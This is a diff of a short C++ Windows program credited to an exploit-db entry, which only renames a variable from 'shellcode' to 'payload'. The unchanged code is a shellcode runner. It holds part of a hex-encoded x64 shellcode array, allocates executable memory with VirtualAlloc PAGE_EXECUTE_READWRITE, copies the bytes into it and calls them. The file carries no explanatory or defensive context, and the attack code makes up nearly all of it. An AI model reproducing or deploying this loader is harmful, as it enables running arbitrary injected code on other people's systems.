@@ -2,10 +2,10 @@
 
 // Author: Carlos Dominguez
 // Based on: https://www.exploit-db.com/exploits/51634
-// Compile: g++ shellcode-64.cpp -o shellcode-64.exe
+// Compile: g++ payload-64.cpp -o payload-64.exe
 
 int main(int argc, char** argv) {
-    char shellcode[] = "\x48\x31\xd2\x65\x48\x8b\x42\x60\x48\x8b\x70\x18\x48\x8b\x76\x20\x4c\x8b\x0e\x4d" 
+    char payload[] = "\x48\x31\xd2\x65\x48\x8b\x42\x60\x48\x8b\x70\x18\x48\x8b\x76\x20\x4c\x8b\x0e\x4d" 
                       "\x8b\x09\x4d\x8b\x49\x20\xeb\x63\x41\x8b\x49\x3c\x4d\x31\xff\x41\xb7\x88\x4d\x01" 
                       "\xcf\x49\x01\xcf\x45\x8b\x3f\x4d\x01\xcf\x41\x8b\x4f\x18\x45\x8b\x77\x20\x4d\x01" 
                       "\xce\xe3\x3f\xff\xc9\x48\x31\xf6\x41\x8b\x34\x8e\x4c\x01\xce\x48\x31\xc0\x48\x31" 
@@ -17,12 +17,13 @@ int main(int argc, char** argv) {
 
     void* exec = VirtualAlloc(
         0,
-        sizeof shellcode,
+        sizeof payload,
         MEM_COMMIT,
         PAGE_EXECUTE_READWRITE
         );
     
-    memcpy(exec, shellcode, sizeof shellcode);
+    memcpy(exec, payload, sizeof payload);
     
     ((void(*)())exec)();
+
 }
